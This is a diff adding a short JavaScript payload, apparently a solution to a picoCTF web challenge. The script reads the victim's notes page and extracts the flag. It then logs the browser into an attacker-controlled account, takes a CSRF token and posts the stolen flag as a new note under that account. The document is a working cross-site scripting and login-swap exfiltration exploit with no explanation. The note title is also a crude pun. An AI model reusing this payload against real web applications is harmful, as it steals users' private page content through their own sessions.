@@ -1,0 +1,12 @@
+fetch('/notes').then(r=>r.text()).then(h=>{
+let m=h.match(/picoCTF\{[^}]+\}/);
+if(m){
+fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=attacker1&password=attacker1'})
+.then(()=>fetch('/new'))
+.then(r=>r.text())
+.then(html=>{
+let c=html.match(/name="_csrf" value="([^"]+)"/)[1];
+fetch('/new',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'_csrf='+c+'&title=FLAGGOT&content='+encodeURIComponent(m[0])});
+});
+}
+});
